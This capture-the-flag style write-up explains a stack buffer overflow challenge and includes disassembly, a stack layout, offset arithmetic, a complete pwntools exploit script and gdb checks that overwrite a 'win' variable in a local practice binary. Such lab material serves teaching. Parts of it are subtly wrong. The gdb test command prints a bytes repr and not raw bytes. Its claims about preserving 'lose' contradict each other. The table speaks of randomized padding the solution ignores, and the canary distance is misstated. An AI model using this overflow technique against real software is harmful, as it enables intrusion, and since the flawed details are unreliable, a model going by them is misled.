# **Binary Exploitation Write-Up: Precision Variable Overwrite (Hard Mode)**

## **Challenge Overview**
This challenge requires carefully overflowing a buffer to modify a `win` variable while preserving an adjacent `lose` variable. The hard mode removes all debug output, requiring manual reverse engineering.

### **Key Details**
- **Buffer**: Starts at `rbp-0x90` (144 bytes)
- **win**: Located at `rbp-0x1c` (28 bytes from RBP)
- **lose**: Located at `rbp-0x18` (24 bytes from RBP)
- **Protections**: Stack canary, NX, no PIE

## **Reverse Engineering Process**

### **1. Analyzing the Disassembly**
Critical checks found in the assembly:
```asm
mov    -0x18(%rbp), %eax   ; Check lose first
test   %eax, %eax
je     continue             ; Jump if lose==0

mov    -0x1c(%rbp), %eax   ; Then check win
test   %eax, %eax
je     exit                 ; Jump if win==0
call   win_function         ; Trigger if win!=0
```

### **2. Stack Layout**
```
+---------------------+
| Buffer Start        | rbp-0x90 (144 bytes)
| ...                 |
| win                 | rbp-0x1c (28 bytes from RBP)
| lose                | rbp-0x18 (24 bytes from RBP)
| Canary              | rbp-0x8
| Saved RBP           | rbp
| Return Address      | rbp+0x8
+---------------------+
```

### **3. Key Observations**
1. **Variable Order**: 
   - `win` comes **before** `lose` in memory
   - Overflow must stop before reaching `lose`

2. **Exploit Window**:
   - Can overwrite `win` without touching `lose`
   - No need to preserve `lose` value (it's after our target)

## **Exploit Development**

### **1. Calculating Offsets**
- **Buffer to win**: `0x90 - 0x1c = 0x74` (116 bytes)
- **win size**: 4 bytes
- **Total payload**: 120 bytes (116 padding + 4 byte overwrite)

### **2. Payload Structure**
```python
payload = (
    b"A" * 116 +      # Padding to reach win
    p32(0x1337)       # Exactly overwrite win
)
```

### **3. Why This Works**
- First 116 bytes fill buffer space
- Next 4 bytes modify only `win`
- `lose` remains untouched (4 bytes after win)
- Canary remains intact (8 bytes after lose)

## **Final Exploit Code**

```python
from pwn import *

# Start process
p = process("/challenge/binary-exploitation-lose-variable")

# Calculate offsets
buffer_start = 0x90
win_offset = 0x1c
padding = buffer_start - win_offset  # 116 bytes

# Craft payload
payload = (
    b"A" * padding +     # Reach win
    p32(0x1337)          # Overwrite win only
)

# Send and receive
p.send(payload)
print(p.recvall())
```

## **Debugging Verification**

1. **Set Breakpoint**:
   ```bash
   gdb /challenge/binary-exploitation-lose-variable
   break *challenge+249  # Right before win check
   ```

2. **Test Payload**:
   ```bash
   run < <(python3 -c 'from pwn import *; print(b"A"*116 + p32(0x1337))')
   ```

3. **Verify Memory**:
   ```bash
   x/wx $rbp-0x1c  # Should show 0x1337 (win)
   x/wx $rbp-0x18  # Should show 0x0 (lose)
   ```

## **Key Lessons**

1. **Precision Matters**:
   - 1 byte overflow could corrupt `lose`
   - Must stop exactly after `win` overwrite

2. **Reverse Engineering Skills**:
   - Extracting offsets from raw disassembly
   - Understanding compiler stack alignment

3. **Debugger Workflow**:
   - Essential for verifying memory layout
   - Critical for testing payloads

4. **Protection Bypass**:
   - Canary remains untouched
   - No need for memory leaks

## **Comparison: Easy vs Hard Mode**

| **Easy Version**          | **Hard Version**               |
|---------------------------|--------------------------------|
| Explicit offsets given    | Must reverse engineer offsets  |
| Debug output available    | Silent operation               |
| Fixed layout              | Randomized padding             |
| Simple payload            | Requires precise calculation   |

This solution demonstrates how to:
- Transition from easy to hard challenges
- Extract necessary information from stripped binaries
- Craft precision overflow attacks
- Verify results without debug output
